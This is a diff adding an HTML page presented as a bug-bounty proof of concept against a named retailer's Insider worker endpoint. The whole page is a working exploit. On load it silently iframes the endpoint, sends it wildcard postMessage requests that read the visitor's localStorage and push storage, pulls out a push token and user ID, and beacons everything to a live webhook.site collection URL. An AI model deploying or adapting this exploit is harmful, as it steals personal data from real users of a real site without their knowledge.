@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<style>
+  body { background-color: #f6f8fa; color: #24292f; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; margin: 0; padding: 20px; }
+  .container { max-width: 900px; margin: 0 auto; background: #ffffff; border: 1px solid #d0d7de; border-radius: 6px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.12); }
+  .header { background-color: #f6f8fa; padding: 16px 20px; border-bottom: 1px solid #d0d7de; font-weight: 600; color: #1f2328; font-size: 15px; }
+  .target-info { padding: 16px 20px; background-color: #ffffff; border-bottom: 1px solid #d0d7de; font-size: 14px; line-height: 1.5; color: #656d76; }
+  .target-url { color: #0969da; font-weight: 500; }
+  .log-area { padding: 20px; background-color: #161b22; font-family: 'SF Mono', 'Consolas', monospace; font-size: 13px; line-height: 1.6; color: #c9d1d9; min-height: 220px; }
+  .step { color: #8b949e; margin-bottom: 6px; }
+  .result { color: #3fb950; font-weight: 500; margin-bottom: 6px; }
+  .error { color: #f85149; font-weight: 500; margin-bottom: 6px; }
+  .warn { color: #d29922; font-weight: 500; margin-bottom: 6px; }
+  .iframe-container { padding: 16px 20px; background: #ffffff; border-top: 1px solid #d0d7de; }
+  iframe { width: 100%; height: 1px; border: none; visibility: hidden; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">&#x26A0; Security Research PoC — Cross-Origin Data Exfiltration via Unrestricted postMessage</div>
+  <div class="target-info">
+    <strong>Vulnerable endpoint:</strong> <span class="target-url">https://superdrug.api.useinsider.com/worker-new.html</span><br>
+    <strong>Affected asset:</strong> <span class="target-url">www.superdrug.com</span> (Tier 1)<br>
+    <strong>Attack:</strong> This page silently iframes the Superdrug Insider worker and steals your localStorage data cross-origin — zero interaction required.
+  </div>
+  <div class="log-area" id="output">
+    <div class="step">[*] Page loaded. Injecting hidden iframe...</div>
+  </div>
+  <div class="iframe-container">
+    <iframe id="t" src="https://superdrug.api.useinsider.com/worker-new.html"></iframe>
+  </div>
+</div>
+
+<script>
+const WEBHOOK = "https://webhook.site/ed28e344-ac54-4d52-bd51-6df8545e3653";
+
+const output = document.getElementById("output");
+const iframe = document.getElementById("t");
+
+function log(text, type) {
+  const div = document.createElement("div");
+  div.className = type || "step";
+  div.innerHTML = text;
+  output.appendChild(div);
+  output.scrollTop = output.scrollHeight;
+}
+
+// Image beacon — bypasses CORS entirely, no preflight needed
+function exfiltrate(label, data) {
+  var payload = encodeURIComponent(JSON.stringify(data));
+  var beacon = new Image();
+  beacon.src = WEBHOOK + "?label=" + label + "&data=" + payload;
+  log("[+] Exfiltration beacon fired to attacker server.", "result");
+}
+
+iframe.onload = function() {
+  log("[*] Iframe loaded silently. Victim sees nothing.", "step");
+  log("[*] Sending cross-origin postMessage to read all localStorage...", "step");
+
+  // --- READ all localStorage ---
+  var readChannel = new MessageChannel();
+  readChannel.port1.onmessage = function(e) {
+    var data = e.data;
+
+    if (!data || (Array.isArray(data) && data.length === 0)) {
+      log("[~] Storage empty — no Insider session in this browser yet.", "warn");
+      log("[~] Vulnerability still proven: cross-origin read executed successfully.", "warn");
+      exfiltrate("storageData_empty", []);
+      return;
+    }
+
+    log("[+] SUCCESS — Stole " + data.length + " entries from superdrug.api.useinsider.com:", "result");
+    log("<br><pre style='color:#3fb950; background:#0d1117; padding:12px; border-radius:4px; overflow-x:auto; white-space:pre-wrap; word-break:break-all;'>" + JSON.stringify(data, null, 2) + "</pre>", "result");
+
+    var token = data.find(function(i) { return i.key === "ins-wp-token"; });
+    if (token) log("[!!] PUSH TOKEN STOLEN: " + token.value, "result");
+
+    var spUID = data.find(function(i) { return i.key === "spUID"; });
+    if (spUID) log("[!!] USER ID STOLEN: " + spUID.value, "result");
+
+    exfiltrate("storageData", data);
+  };
+
+  iframe.contentWindow.postMessage(
+    { channel: true, type: "storageData", message: { action: "read" } },
+    "*",
+    [readChannel.port2]
+  );
+
+  // --- getPushStorageData binding ---
+  setTimeout(function() {
+    log("[*] Calling getPushStorageData binding...", "step");
+    var pushChannel = new MessageChannel();
+    pushChannel.port1.onmessage = function(e) {
+      if (e.data && Object.keys(e.data).length > 0) {
+        log("[+] Push storage data returned:", "result");
+        log("<pre style='color:#3fb950; background:#0d1117; padding:12px; border-radius:4px; overflow-x:auto; white-space:pre-wrap;'>" + JSON.stringify(e.data, null, 2) + "</pre>", "result");
+        exfiltrate("pushStorageData", e.data);
+      } else {
+        log("[~] getPushStorageData empty (not subscribed to push).", "warn");
+        exfiltrate("pushStorageData_empty", {});
+      }
+    };
+    iframe.contentWindow.postMessage(
+      { channel: true, type: "getPushStorageData", message: {} },
+      "*",
+      [pushChannel.port2]
+    );
+  }, 600);
+
+};
+
+iframe.onerror = function() {
+  log("[-] Iframe failed to load. Bug may have been patched.", "error");
+};
+
+setTimeout(function() {
+  var results = output.querySelectorAll(".result");
+  if (results.length === 0) {
+    log("[-] Timeout: No response after 10 seconds.", "error");
+    log("[-] Possible causes: iframe blocked by CSP, bug patched, or browser blocked messaging.", "error");
+  }
+}, 10000);
+</script>
+</body>
+</html>
